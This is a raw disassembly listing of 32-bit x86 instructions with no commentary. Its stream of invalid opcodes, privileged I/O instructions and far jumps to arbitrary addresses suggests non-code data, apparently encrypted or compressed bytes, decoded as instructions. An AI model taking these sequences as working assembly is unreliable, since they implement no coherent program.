  5247a3:	mov    BYTE PTR [ebx+edi*8+0x2f063926],0xcd
  5247ab:	jmp    0x2f4b:0x39ad0fda
  5247b2:	test   DWORD PTR [ebp+0x3c],ecx
  5247b5:	jno    0x5247f6
  5247b7:	pop    es
  5247b8:	in     al,0xb8
  5247ba:	push   ds
  5247bb:	xchg   BYTE PTR [esi],ch
  5247bd:	mov    dl,BYTE PTR [ebx+0x531791cd]
  5247c3:	cmp    BYTE PTR [ebx],ch
  5247c5:	inc    esp
  5247c6:	xchg   edx,eax
  5247c7:	hlt    
  5247c8:	outs   dx,BYTE PTR ds:[esi]
  5247c9:	adc    DWORD PTR [eax],esi
  5247cb:	dec    ecx
  5247cc:	jo     0x5247da
  5247ce:	(bad)  [ecx+0x2d]
  5247d1:	stos   BYTE PTR es:[edi],al
  5247d2:	jmp    0x524845
  5247d4:	out    0x69,al
  5247d6:	xor    al,0x94
  5247d8:	stos   BYTE PTR es:[edi],al
  5247d9:	lahf   
  5247da:	(bad)  
  5247db:	cld    
  5247dc:	jl     0x5247b6
  5247de:	clc    
  5247df:	jge    0x52485c
  5247e1:	mov    bl,0xa8
  5247e3:	fwait
  5247e4:	mov    eax,ds:0xce12c63c
  5247e9:	add    ecx,esp
  5247eb:	test   eax,0xeace2d76
  5247f0:	pop    esi
  5247f1:	mov    ds:0xc400fc0e,al
  5247f6:	or     eax,0xe77b93d9
  5247fb:	pop    edi
  5247fc:	cmc    
  5247fd:	or     DWORD PTR [ebp+0x2],ebx
  524800:	out    dx,al
  524801:	sar    ebx,0xe3
  524804:	jg     0x524787
  524806:	push   es
  524807:	mov    cl,BYTE PTR [edx-0x1d]
  52480a:	sar    BYTE PTR [edi],1
  52480c:	xor    al,0x39
  52480e:	pop    eax
  52480f:	icebp  
  524810:	xchg   edx,eax
  524811:	pop    ebx
  524812:	adc    eax,0x5016eba2
  524817:	out    0x41,eax
  524819:	sti    
  52481a:	push   cs
  52481b:	jo     0x524827
  52481d:	lods   al,BYTE PTR ds:[esi]
  52481e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  52481f:	out    dx,al
  524820:	dec    esp
  524821:	aad    0x8c
  524823:	fdivr  QWORD PTR [eax+0x530efed9]
  524829:	lahf   
  52482a:	inc    ebx
  52482b:	rcl    edx,0xe8
  52482e:	imul   edi,DWORD PTR [ebx+0xa],0x1401e1d5
  524835:	cmp    al,0x92
  524837:	shr    DWORD PTR [edi-0x6a322ec],1
  52483d:	xor    al,0x69
  52483f:	stc    
  524840:	or     edx,ebp
  524842:	xor    DWORD PTR [eax+0xfa6e449],edi
  524848:	cld    
  524849:	xor    cl,BYTE PTR ds:0xb2f5bf39
  52484f:	dec    edi
  524850:	xchg   BYTE PTR [ecx+0x53ae4beb],cl
  524856:	scas   eax,DWORD PTR es:[edi]
  524857:	and    BYTE PTR [edx],al
  524859:	cmp    al,0x32
  52485b:	mov    ds:0xcbab024,eax
  524860:	dec    esp
  524861:	daa    
  524862:	sbb    al,0x8c
  524864:	lods   eax,DWORD PTR ds:[esi]
  524865:	adc    bl,bh
  524867:	jg     0x524812
  524869:	fbstp  TBYTE PTR [eax+0x5ed5ccab]
  52486f:	dec    ebp
  524870:	fdivr  QWORD PTR [edi-0x56f3df6f]
  524876:	push   es
  524877:	cmp    bl,0x2e
  52487a:	in     al,0x1
  52487c:	aam    0x49
  52487e:	and    DWORD PTR [ebp+eiz*8-0x15a3e26e],0x41d41883
  524889:	xor    al,0xc4
  52488b:	and    DWORD PTR [ebp+0x48],ebp
  52488e:	fcom   DWORD PTR [ebx-0x4e]
  524891:	fs loope 0x5248cb
  524894:	hlt    
  524895:	outs   dx,DWORD PTR ds:[esi]
  524896:	push   ss
  524897:	call   0x22e84ccf
  52489c:	add    DWORD PTR [ebx+ebx*2-0x239eddf9],ecx
  5248a3:	enter  0x9ca0,0x1e
  5248a7:	loope  0x52485a
  5248a9:	cwde   
  5248aa:	aas    
  5248ab:	or     edi,edx
  5248ad:	fucom  st(1)
  5248af:	mov    DWORD PTR [ebp+0x36],edi
  5248b2:	cmp    BYTE PTR [ecx],cl
  5248b4:	mov    bl,0x1d
  5248b6:	das    
  5248b7:	enter  0xe5c3,0x5a
  5248bb:	bnd jg 0x52489d
  5248be:	sbb    ecx,eax
  5248c0:	xchg   esp,eax
  5248c1:	call   0x9409:0x245d6b76
  5248c8:	jg     0x5248e7
  5248ca:	icebp  
  5248cb:	mov    eax,ds:0xc8a5f2d2
  5248d0:	and    BYTE PTR [esi-0x42],ah
  5248d3:	and    al,0xca
  5248d5:	mov    ?,ebp
  5248d7:	add    eax,0x100d3f61
  5248dc:	in     al,dx
  5248dd:	pushf  
  5248de:	outs   dx,DWORD PTR ds:[esi]
  5248df:	and    bl,BYTE PTR [edi-0xe18f154]
  5248e5:	nop
  5248e6:	in     al,dx
  5248e7:	iret   
  5248e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  5248e9:	mov    bl,0x6a
  5248eb:	xor    al,0x73
  5248ed:	mov    eax,ds:0x3b4b38e9
  5248f2:	jne    0x52488c
  5248f4:	pushf  
  5248f5:	jo     0x524963
  5248f7:	fistp  DWORD PTR [ebx+0x559cfeee]
  5248fd:	adc    DWORD PTR [ebp+0x69b6b163],edi
  524903:	jg     0x524939
  524905:	mov    ds:0xdef4df0f,al
  52490a:	pop    ebp
  52490b:	mov    edi,0xa15bc9a1
  524910:	sub    DWORD PTR [esi-0x37011f42],ebp
  524916:	mov    edi,DWORD PTR [edi+0x3370b1df]
  52491c:	inc    eax
  52491d:	or     BYTE PTR [ecx+0x72286190],dl
  524923:	xchg   BYTE PTR [esi-0x12aa5315],al
  524929:	and    edi,ecx
  52492b:	ja     0x524988
  52492d:	jecxz  0x52497d
  52492f:	inc    eax
  524930:	arpl   si,bp
  524932:	in     al,0x90
  524934:	outs   dx,BYTE PTR ds:[esi]
  524935:	lods   eax,DWORD PTR ds:[esi]
  524936:	jo     0x5248e8
  524938:	inc    esp
  524939:	test   cl,0x58
  52493c:	mov    bh,0x4
  52493e:	inc    esp
  52493f:	mov    ds:0x44129c7c,eax
  524944:	cmp    eax,0x7959f088
  524949:	push   ds
  52494a:	and    BYTE PTR [eax-0x579b196f],cl
  524950:	dec    esp
  524951:	aad    0xe8
  524953:	pusha  
  524954:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  524955:	jl     0x52494f
  524957:	aad    0xfd
  524959:	and    BYTE PTR ds:0x90c8c0d4,bh
  52495f:	pop    esp
  524960:	push   0x77
  524962:	rcr    ecx,cl
  524964:	jecxz  0x5249d4
  524966:	mov    eax,ds:0x6c50798c
  52496b:	adc    eax,0x1a2cac4c
  524970:	ret    
  524971:	sbb    edi,DWORD PTR [eax+0x652d51ea]
  524977:	add    DWORD PTR [ecx],ebx
  524979:	sar    DWORD PTR [eax+0x71],cl
  52497c:	pop    ebx
  52497d:	out    0x4e,al
  52497f:	xchg   edi,esi
  524981:	mov    ebp,0xf4e6a353
  524986:	data16 aad 0x1f
  524989:	mov    BYTE PTR [eax+0x56a7a52d],dl
  52498f:	ins    DWORD PTR es:[edi],dx
  524990:	or     DWORD PTR [eax+0x48],edx
  524993:	pop    esi
  524994:	(bad)  
  524995:	sub    ebp,eax
  524997:	mov    al,ds:0xf235d97c
  52499c:	sub    eax,0x47633545
  5249a1:	pop    ecx
  5249a2:	out    0xc7,eax
  5249a4:	push   ecx
  5249a5:	or     BYTE PTR [edx+esi*4+0x33],ah
  5249a9:	and    eax,0x87fcca0c
  5249ae:	repnz fstp TBYTE PTR [ecx]
  5249b1:	mov    eax,ds:0xe76af84d
  5249b6:	mov    ds:0x424972a6,al
  5249bb:	adc    bh,BYTE PTR [edx]
  5249bd:	mov    ecx,0x5578190e
  5249c2:	adc    al,0x7b
  5249c4:	ror    DWORD PTR [ebp-0xe],1
  5249c7:	lock jne 0x52495a
  5249ca:	stos   DWORD PTR es:[edi],eax
  5249cb:	and    eax,0x1a095971
  5249d0:	scas   eax,DWORD PTR es:[edi]
  5249d1:	lods   al,BYTE PTR ds:[esi]
  5249d2:	in     al,0x2f
  5249d4:	leave  
  5249d5:	dec    eax
  5249d6:	add    DWORD PTR [ecx+0x58],edi
  5249d9:	inc    esi
  5249da:	rol    BYTE PTR [esi-0x131f46b],cl
  5249e0:	ins    BYTE PTR es:[edi],dx
  5249e1:	mov    dl,0x38
  5249e3:	mov    esp,DWORD PTR [eax]
  5249e5:	xor    DWORD PTR [ebx+0x23],0xffffff9c
  5249e9:	nop
  5249ea:	(bad)  [edi+0x23]
  5249ed:	mov    dh,0x84
  5249ef:	push   ebx
  5249f0:	fwait
  5249f1:	push   ebp
  5249f2:	push   eax
  5249f3:	ja     0x5249f8
  5249f5:	push   ss
  5249f6:	pusha  
  5249f7:	je     0x5249df
  5249f9:	fidiv  DWORD PTR [eax+0x23]
  5249fc:	imul   esi,DWORD PTR [esi],0x5bfe9c41
  524a02:	test   al,0x1f
  524a04:	dec    edx
  524a05:	in     eax,dx
  524a06:	push   ebp
  524a07:	push   es
  524a08:	jge    0x5249b4
  524a0a:	mov    WORD PTR [ebp-0x1b39b8e7],?
  524a10:	mov    ecx,0x7092ca53
  524a15:	clc    
  524a16:	dec    esp
  524a17:	fnsave [edx]
  524a19:	shl    DWORD PTR [edi],1
  524a1b:	fsubr  QWORD PTR [ecx+0x7e9a779f]
  524a21:	inc    esi
  524a22:	test   al,0xb9
  524a24:	pop    eax
  524a25:	bound  eax,QWORD PTR [edi]
  524a27:	xchg   ecx,eax
  524a28:	stc    
  524a29:	push   esi
  524a2a:	call   0xd7e0:0xab2d2edf
  524a31:	jae    0x524a54
  524a33:	or     DWORD PTR [edi+ebp*8+0x23],ecx
  524a37:	jmp    0xd73e:0x36853794
  524a3e:	fsub   st,st(4)
  524a40:	ficom  DWORD PTR [edi-0x3047d9e2]
  524a46:	int3   
  524a47:	xlat   BYTE PTR ds:[ebx]
  524a48:	les    esi,FWORD PTR [esi-0x47]
  524a4b:	push   ebx
  524a4c:	(bad)  
  524a4d:	push   ss
  524a4e:	mov    ebp,0x3e9542ec
  524a53:	sbb    DWORD PTR [esi-0x5f],0xffffffb7
  524a57:	ret    0x6822
  524a5a:	and    ebp,ebx
  524a5c:	mov    edi,0xbba76b2c
  524a61:	int3   
  524a62:	fs jge 0x524ab9
  524a65:	add    eax,0x8d7cab34
  524a6a:	or     DWORD PTR [ecx],ebx
  524a6c:	mov    eax,0x8177faaa
  524a71:	and    eax,0xb4996403
  524a76:	mov    ds:0x137494d0,eax
  524a7b:	push   ss
  524a7c:	ins    DWORD PTR es:[edi],dx
  524a7d:	pop    edi
  524a7e:	out    0x81,al
  524a80:	and    ch,BYTE PTR [esi+eax*1+0x1e]
  524a84:	mov    dh,0x53
  524a86:	jl     0x524a43
  524a88:	rcl    BYTE PTR [ecx+0x56],1
  524a8b:	mov    ebp,0xddd74bb4
  524a90:	inc    ebp
  524a91:	jno    0x524a69
  524a93:	pop    es
  524a94:	add    eax,DWORD PTR [ebx]
  524a96:	adc    ebp,DWORD PTR [ebx-0x15]
  524a99:	ret    
  524a9a:	add    eax,DWORD PTR [ebp+0x4c]
  524a9d:	ds ja  0x524a59
  524aa0:	sub    BYTE PTR [eax+0x55],ah
  524aa3:	bound  ebp,QWORD PTR ds:0x7193b15b
  524aa9:	adc    al,0xee
  524aab:	inc    edx
  524aac:	imul   edi,DWORD PTR ds:[ebx-0x4abe4d9c],0xffffff83
  524ab4:	mov    ds:0x6809a662,al
  524ab9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  524aba:	mov    cl,0x6b
  524abc:	push   edi
  524abd:	jp     0x524abb
  524abf:	ror    BYTE PTR [edi+0x35506d19],cl
  524ac5:	pop    ds
  524ac6:	cs loop 0x524a52
  524ac9:	fsubr  st(7),st
  524acb:	and    BYTE PTR [ebx+0x2027cea1],0xa
  524ad2:	outs   dx,BYTE PTR ds:[esi]
  524ad3:	adc    al,0x3f
  524ad5:	std    
  524ad6:	stos   DWORD PTR es:[edi],eax
  524ad7:	sbb    BYTE PTR [edx+0x2d],bl
  524ada:	jmp    0x524a8c
  524adc:	or     ch,ch
  524ade:	and    DWORD PTR [ebx+0x41],ecx
  524ae1:	out    0x1,eax
  524ae3:	dec    edi
  524ae4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  524ae5:	sub    ah,BYTE PTR [eax+0x7bf4c86e]
  524aeb:	(bad)  
  524aec:	repz in al,dx
  524aee:	enter  0xd02d,0xc0
  524af2:	mov    esp,0xd901d3ee
  524af7:	enter  0x3b34,0x90
  524afb:	sbb    dh,BYTE PTR [edx+eax*1]
  524afe:	mov    edi,0x4ac43dde
  524b03:	std    
  524b04:	sbb    al,0xcf
  524b06:	push   esp
  524b07:	mov    bh,0xa4
  524b09:	pop    ebx
  524b0a:	es int 0x69
  524b0d:	(bad)  
  524b0e:	ror    bl,1
  524b10:	mov    eax,0xb8e57e6b
  524b15:	in     al,0xc
  524b17:	cs cmp al,0x22
  524b1a:	ds push edi
  524b1c:	das    
  524b1d:	shl    DWORD PTR [ecx],0xf
  524b20:	into   
  524b21:	xor    BYTE PTR [ebp+0x655197a5],ah
  524b27:	push   ebx
  524b28:	stc    
  524b29:	je     0x524b4a
  524b2b:	mov    cl,BYTE PTR [edx-0x254dadd5]
  524b31:	jg     0x524b74
  524b33:	adc    al,0xf6
  524b35:	pushf  
  524b36:	xlat   BYTE PTR ds:[ebx]
  524b37:	int3   
  524b38:	(bad)  
  524b39:	icebp  
  524b3a:	mov    bh,0x54
  524b3c:	in     al,0xc9
  524b3e:	pop    ebx
  524b3f:	xchg   edx,eax
  524b40:	jecxz  0x524b45
  524b42:	stos   DWORD PTR es:[edi],eax
  524b43:	add    BYTE PTR [eax-0x80ce40e],0xaa
  524b4a:	(bad)  
  524b4b:	aad    0x7c
  524b4d:	shl    esi,cl
  524b4f:	or     al,bl
  524b51:	cmp    al,0x21
  524b53:	mov    cl,0xf
  524b55:	adc    ebx,esi
  524b57:	je     0x524af0
  524b59:	(bad)  
  524b5a:	jge    0x524ae2
  524b5c:	imul   ebx,ecx,0xa22c39c0
  524b62:	push   0xcb1cc0de
  524b67:	mov    ebx,0x2d0e9205
  524b6c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  524b6d:	jecxz  0x524b7f
  524b6f:	sti    
  524b70:	dec    edx
  524b71:	push   ecx
  524b72:	enter  0x99ec,0xde
  524b76:	sub    dh,dh
  524b78:	sbb    eax,0x92ab0f28
  524b7d:	dec    ebx
  524b7e:	dec    esi
  524b7f:	sahf   
  524b80:	or     edx,DWORD PTR [edx+0x60]
  524b83:	daa    
  524b84:	inc    esp
  524b85:	adc    BYTE PTR ds:0x8db28621,dh
  524b8b:	outs   dx,BYTE PTR ds:[esi]
  524b8c:	add    ebx,DWORD PTR [ecx]
  524b8e:	add    DWORD PTR [esi-0x3024189f],0xffffffff
  524b95:	aad    0x3b
  524b97:	mov    edx,0x91eb766c
  524b9c:	jge    0x524be3
  524b9e:	and    eax,0xb449ba90
  524ba3:	push   ss
  524ba4:	(bad)  
  524ba5:	adc    eax,0x59edc4c
  524baa:	sub    al,0x29
  524bac:	lds    eax,FWORD PTR [edx+ebx*8-0x47192001]
  524bb3:	ins    DWORD PTR es:[edi],dx
  524bb4:	inc    edx
  524bb5:	mov    edx,edi
  524bb7:	mov    dl,0xdd
  524bb9:	out    0x4e,al
  524bbb:	xor    BYTE PTR [esi],cl
  524bbd:	jmp    0x524bda
  524bbf:	je     0x524b78
  524bc1:	mov    edx,0x2937eda7
  524bc6:	data16 fidivr DWORD PTR [ebx-0xb]
  524bca:	scas   al,BYTE PTR es:[edi]
  524bcb:	jae    0x524b74
  524bcd:	pushf  
  524bce:	xor    cl,BYTE PTR [edx+0x161da4f3]
  524bd4:	jecxz  0x524c21
  524bd6:	ds retf 0x1ca4
  524bda:	sbb    eax,0xc7fc7ad0
  524bdf:	imul   edx,DWORD PTR [edx+0x39],0x21c6b430
  524be6:	shl    cl,0x5a
  524be9:	dec    esp
  524bea:	sub    bl,BYTE PTR [esp+edi*8-0x1f5a02c2]
  524bf1:	popf   
  524bf2:	stos   DWORD PTR es:[edi],eax
  524bf3:	pop    esp
  524bf4:	sub    eax,0x46b8c272
  524bf9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  524bfa:	inc    ebp
  524bfb:	and    eax,0xceef45f8
  524c00:	add    al,BYTE PTR [ebx]
  524c02:	imul   edx,DWORD PTR [edx+esi*1+0x29],0x7
  524c07:	and    al,0x1f
  524c09:	mov    al,0xe8
  524c0b:	into   
  524c0c:	adc    ah,BYTE PTR ds:0xe53bfbad
  524c12:	sub    dh,BYTE PTR [esp+esi*8-0x3e]
  524c16:	fld    QWORD PTR [eax]
  524c18:	std    
  524c19:	in     al,dx
  524c1a:	mov    WORD PTR [edi],ds
  524c1c:	int    0x6d
  524c1e:	sbb    BYTE PTR [edx-0x65],bl
  524c21:	inc    edx
  524c22:	push   0xa3061d9b
  524c27:	mov    ah,0x86
  524c29:	rcr    DWORD PTR [ebp+esi*8-0x7d85afc9],cl
  524c30:	jmp    0x494673b0
  524c35:	or     BYTE PTR [ecx+0x62],dh
  524c38:	xor    DWORD PTR [esi+0x12e7b099],0x66
  524c3f:	fisttp QWORD PTR [edi]
  524c41:	and    al,0xe2
  524c43:	dec    esi
  524c44:	xor    cl,BYTE PTR [ebx]
  524c46:	idiv   eax
  524c48:	cmp    BYTE PTR [edi+0x46b88e57],cl
  524c4e:	push   ecx
  524c4f:	pop    es
  524c50:	pop    ecx
  524c51:	test   DWORD PTR [ecx+0x1c],edi
  524c54:	jmp    0xb231e6f5
  524c59:	jnp    0x524cc2
  524c5b:	test   al,0x7b
  524c5d:	call   FWORD PTR gs:[ebx-0x6d]
  524c61:	cmp    ebx,DWORD PTR [ebp-0x47]
  524c64:	mov    esi,0x6091bd5d
  524c69:	lds    esp,FWORD PTR [ebx-0x5b]
  524c6c:	enter  0xd5c9,0x8d
  524c70:	(bad)  
  524c72:	fst    DWORD PTR [eax]
  524c74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  524c75:	dec    edi
  524c76:	pop    edx
  524c77:	cmp    bl,ah
  524c79:	jmp    0xf21d:0xa6090b7
  524c80:	sbb    BYTE PTR [edx-0x32],ch
  524c83:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  524c84:	aam    0x67
  524c86:	cmp    eax,0x836f7a6b
  524c8b:	rcl    DWORD PTR [edx+0x239c6d8a],cl
  524c91:	mov    ds:0x510e9eab,al
  524c96:	mov    DWORD PTR ds:0x38bde518,0x54a2f298
  524ca0:	push   ds
  524ca1:	jae    0x524c88
  524ca3:	icebp  
  524ca4:	push   cs
  524ca5:	repz adc BYTE PTR [edi-0x22],dl
  524ca9:	jne    0x524c83
  524cab:	retf   
  524cac:	rol    DWORD PTR [ecx+0xec4c97a],cl
  524cb2:	icebp  
  524cb3:	loope  0x524d00
  524cb5:	mov    eax,ds:0x845854d2
  524cba:	or     DWORD PTR [eax],0xffffffb5
  524cbd:	cdq    
  524cbe:	and    cl,BYTE PTR [edi+0x44]
  524cc1:	xor    DWORD PTR [edx+0x51],ebx
  524cc4:	popf   
  524cc5:	pushf  
  524cc6:	xchg   al,cl
  524cc8:	pop    esi
  524cc9:	aam    0x4e
  524ccb:	push   ss
  524ccc:	or     eax,0xd405c7e1
  524cd1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  524cd2:	lea    ecx,[eax+0x36]
  524cd5:	sub    DWORD PTR [eax+0x73],ebx
  524cd8:	and    cl,BYTE PTR [edx]
  524cda:	in     al,0x3
  524cdc:	xchg   eax,ecx
  524cde:	inc    ebx
  524cdf:	pop    ebp
  524ce0:	ror    DWORD PTR [ebx+0x1b70380c],0x14
  524ce7:	inc    edx
  524ce8:	cdq    
  524ce9:	(bad)  
  524cea:	out    0x16,eax
  524cec:	sar    BYTE PTR [edx],1
  524cee:	js     0x524c8d
  524cf0:	mov    cl,BYTE PTR [edx-0x75c3c279]
  524cf6:	dec    esp
  524cf7:	adc    eax,0x1b61fc35
  524cfc:	aaa    
  524cfd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  524cfe:	dec    ecx
  524cff:	xchg   al,dl
  524d01:	xchg   esi,eax
  524d02:	loope  0x524d10
  524d04:	int    0x14
  524d06:	aad    0x26
  524d08:	xor    ebp,DWORD PTR [ecx]
  524d0a:	out    dx,al
  524d0b:	xchg   esi,eax
  524d0c:	ss aaa 
  524d0e:	push   ebx
  524d0f:	sub    ch,dl
  524d11:	jge    0x524d26
  524d13:	and    eax,0xb1294db
  524d18:	xchg   esp,eax
  524d19:	fdivr  DWORD PTR [esi+0x5f]
  524d1c:	dec    eax
  524d1d:	mov    dl,0x4a
  524d1f:	sub    al,BYTE PTR [esi-0x24ec5849]
  524d25:	lods   eax,DWORD PTR ds:[esi]
  524d26:	xchg   ebp,eax
  524d27:	addr16 push ebx
  524d29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  524d2a:	stos   BYTE PTR es:[edi],al
  524d2b:	lds    ebp,FWORD PTR cs:[esi-0x759f990b]
  524d32:	addr16 je 0x524d8b
  524d35:	xor    BYTE PTR [edi],cl
  524d37:	das    
  524d38:	mov    dh,0xe2
  524d3a:	mov    ds,WORD PTR [edi+0x56]
  524d3d:	xchg   ebx,eax
  524d3e:	lock cmp al,0xc5
  524d41:	xor    DWORD PTR [ebx],esi
  524d43:	push   eax
  524d44:	pushf  
  524d45:	xor    ch,dl
  524d47:	mov    ?,WORD PTR [ebp+0x78c8acc3]
  524d4d:	dec    ebp
  524d4e:	mov    ah,BYTE PTR [ecx-0x3f3ff368]
  524d54:	sbb    edi,ebx
  524d56:	inc    edi
  524d57:	xor    eax,0xbb91eb60
  524d5c:	xchg   edx,eax
  524d5d:	mov    edx,0xf72c50f7
  524d62:	imul   DWORD PTR [esi-0x7de6f6f5]
  524d68:	leave  
  524d69:	imul   ebp,DWORD PTR [esi+0x76],0xa014c9f9
  524d70:	aaa    
  524d71:	pop    esp
  524d72:	shr    bh,1
  524d74:	inc    ebx
  524d75:	loop   0x524d3a
  524d77:	xor    ebx,DWORD PTR [edi]
  524d79:	adc    bl,BYTE PTR [esi-0x38]
  524d7c:	mov    al,ds:0x3af7ddc8
  524d81:	xchg   ebx,eax
  524d82:	shl    BYTE PTR ds:0x278342a4,cl
  524d89:	jge    0x524d53
  524d8b:	jmp    0xa0d14881
  524d90:	dec    ebx
  524d91:	jmp    0x524d9f
  524d93:	addr16 sub al,0xe7
  524d96:	sbb    BYTE PTR [edi+ebp*8+0x41],bl
  524d9a:	jne    0x524d95
  524d9c:	mov    eax,ds:0x967d9631
  524da1:	sbb    esi,ebp
  524da3:	add    edx,esi
  524da5:	mov    esp,0xae51be9
  524daa:	adc    ebp,DWORD PTR [esi]
  524dac:	push   edx
  524dad:	pusha  
  524dae:	mov    ah,0xf3
  524db0:	(bad)  
  524db1:	ds jns 0x524d4d
  524db4:	fidivr WORD PTR [ebx+0x399938e4]
  524dba:	sbb    bh,BYTE PTR [edx]
  524dbc:	adc    bh,BYTE PTR [eax+edi*2-0x759efb9a]
  524dc3:	outs   dx,BYTE PTR ss:[esi]
  524dc5:	inc    ebp
  524dc6:	imul   DWORD PTR [esi]
  524dc8:	pop    esp
  524dc9:	lahf   
  524dca:	mov    edi,0x871fddb2
  524dcf:	cmp    al,0x7e
  524dd1:	sbb    BYTE PTR [eax],ah
  524dd3:	pop    ebp
  524dd4:	lock adc ebp,DWORD PTR [edx]
  524dd7:	push   es
  524dd8:	cli    
  524dd9:	and    DWORD PTR [edi-0x73],0xffffffcd
  524ddd:	pop    edx
  524dde:	jbe    0x524d7d
  524de0:	dec    ebx
  524de1:	mov    esi,0x254fc3fe
  524de6:	adc    DWORD PTR ds:0x91b3c559,ebp
  524dec:	dec    eax
  524ded:	cdq    
  524dee:	sub    al,0x3a
  524df0:	dec    esi
  524df1:	jp     0x524d8a
  524df3:	cmp    esi,ebp
  524df5:	xchg   BYTE PTR [ebx],bh
  524df7:	sbb    al,0xbd
  524df9:	mov    edx,0x3e9fc128
  524dfe:	pushf  
  524dff:	push   esp
  524e00:	fcomp  DWORD PTR [esi+eax*8+0x59]
  524e04:	or     DWORD PTR [edi],edi
  524e06:	aas    
  524e07:	and    BYTE PTR [ebp+edi*4-0x4],cl
  524e0b:	xchg   edi,eax
  524e0c:	pop    esi
  524e0d:	mov    ebx,0xba41cc4a
  524e12:	into   
  524e13:	inc    ebx
  524e14:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  524e15:	fbld   TBYTE PTR [ebp-0x17]
  524e18:	push   cs
  524e19:	cmp    al,BYTE PTR ds:0x4f19a7fb
  524e1f:	and    DWORD PTR [edi+0x17],ecx
  524e22:	xchg   esi,eax
  524e23:	(bad)  
  524e24:	sbb    al,0x62
  524e26:	mov    WORD PTR [eax+ecx*4-0x3c],es
  524e2a:	sbb    al,0x1e
  524e2c:	stos   DWORD PTR es:[edi],eax
  524e2d:	enter  0x54d8,0x8b
  524e31:	jmp    0x4a0ca10d
  524e36:	outs   dx,DWORD PTR ds:[esi]
  524e37:	cmp    al,BYTE PTR [edx+eiz*8-0x5caef692]
  524e3e:	stc    
  524e3f:	lock push eax
  524e41:	inc    ecx
  524e42:	repnz or bl,0x49
  524e46:	add    DWORD PTR [edi+eax*2],edi
  524e49:	mov    ecx,0x301bd0c6
  524e4e:	cli    
  524e4f:	std    
  524e50:	aad    0x36
  524e52:	or     BYTE PTR [eax+0x52],0xd3
  524e56:	push   eax
  524e57:	in     eax,dx
  524e58:	mov    edx,0xc9737b60
  524e5d:	and    bh,BYTE PTR [esi-0x493cab13]
  524e63:	aad    0x62
  524e65:	jnp    0x524eaf
  524e67:	add    DWORD PTR [eax-0x5c21220c],0x6e19bf70
  524e71:	rcr    DWORD PTR [ebx],0x30
  524e74:	outs   dx,DWORD PTR ds:[esi]
  524e75:	pop    ecx
  524e76:	ins    BYTE PTR es:[edi],dx
  524e77:	clc    
  524e78:	dec    eax
  524e79:	mov    ds:0x70c016c4,eax
  524e7e:	push   edi
  524e7f:	test   al,0x61
  524e81:	mov    al,ds:0x1c062349
  524e86:	mov    ecx,0xe9845a26
  524e8b:	xor    eax,0x21706d9c
  524e90:	loopne 0x524e70
  524e92:	xchg   DWORD PTR [ebx],esi
  524e94:	mov    WORD PTR [eax+esi*2],?
  524e97:	xor    DWORD PTR [eax-0x43f45f7a],edx
  524e9d:	mov    edx,0xdc2ba93a
  524ea2:	loop   0x524e33
  524ea4:	pop    edx
  524ea5:	mov    es,eax
  524ea7:	jmp    0xe7b89d0a
  524eac:	jns    0x524f1a
  524eae:	outs   dx,BYTE PTR ds:[esi]
  524eaf:	dec    edx
  524eb0:	nop
  524eb1:	xchg   esi,eax
  524eb2:	jns    0x524f1d
  524eb4:	or     eax,0x16882d59
  524eb9:	jmp    0xcdbd:0x52487dc9
  524ec0:	out    0x53,al
  524ec2:	push   esi
  524ec3:	arpl   si,si
  524ec5:	rol    BYTE PTR [ebp+0x54],1
  524ec8:	(bad)  
  524eca:	ja     0x524ef7
  524ecc:	pop    esp
  524ecd:	xchg   edx,eax
  524ece:	push   es
  524ecf:	jg     0x524f04
  524ed1:	pusha  
  524ed2:	fwait
  524ed3:	xchg   ch,cl
  524ed5:	aad    0x7a
  524ed7:	fadd   QWORD PTR es:[ecx+eiz*8-0x2fdd844]
  524edf:	and    ch,dh
  524ee1:	mov    ch,0xfc
  524ee3:	push   es
  524ee4:	(bad)  
  524ee5:	f2xm1  
  524ee7:	aas    
  524ee8:	das    
  524ee9:	enter  0x723d,0x84
  524eed:	ja     0x524f19
  524eef:	(bad)  
  524ef1:	(bad)  
  524ef2:	jmp    0x524f2f
  524ef4:	ds and esp,ebx
  524ef7:	and    BYTE PTR [ebx],dh
  524ef9:	inc    eax
  524efa:	stos   DWORD PTR es:[edi],eax
  524efb:	test   DWORD PTR [esi-0xa3cf7a6],ecx
  524f01:	adc    DWORD PTR [eax],eax
  524f03:	rcl    DWORD PTR [edi-0x46612112],cl
  524f09:	adc    DWORD PTR [eax+0x1d],eax
  524f0c:	std    
  524f0d:	push   ebx
  524f0e:	or     eax,0xb20d3d1
  524f13:	jmp    0x524edb
  524f15:	xchg   ecx,eax
  524f16:	stos   BYTE PTR es:[edi],al
  524f17:	cmp    ah,BYTE PTR [ebx]
  524f19:	in     al,dx
  524f1a:	inc    esp
  524f1b:	pop    ss
  524f1c:	mov    bl,0xec
  524f1e:	cmc    
  524f1f:	iret   
  524f20:	sub    DWORD PTR gs:[esi],ebx
  524f23:	mov    bh,0x99
  524f25:	push   eax
  524f26:	hlt    
  524f27:	or     al,0xad
  524f29:	cmc    
  524f2a:	scas   al,BYTE PTR es:[edi]
  524f2b:	out    dx,eax
  524f2c:	or     DWORD PTR [edi+0x5ace6d76],ecx
  524f32:	call   0xc6b4883f
  524f37:	loopne 0x524eba
  524f39:	ret    0x9d2d
  524f3c:	enter  0x3b3e,0xc6
  524f40:	into   
  524f41:	in     al,0xef
  524f43:	mov    edi,0x80a60b23
  524f48:	and    al,BYTE PTR [ecx]
  524f4a:	ret    0xc311
  524f4d:	xchg   ebp,eax
  524f4e:	xsha256 (bad)
  524f4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  524f50:	xchg   ecx,eax
  524f51:	cdq    
  524f52:	sbb    BYTE PTR [eax-0x53],0xd
  524f56:	mov    ebx,0xf03fde7f
  524f5b:	push   esp
  524f5c:	push   edx
  524f5d:	sbb    DWORD PTR [si-0x210b],edi
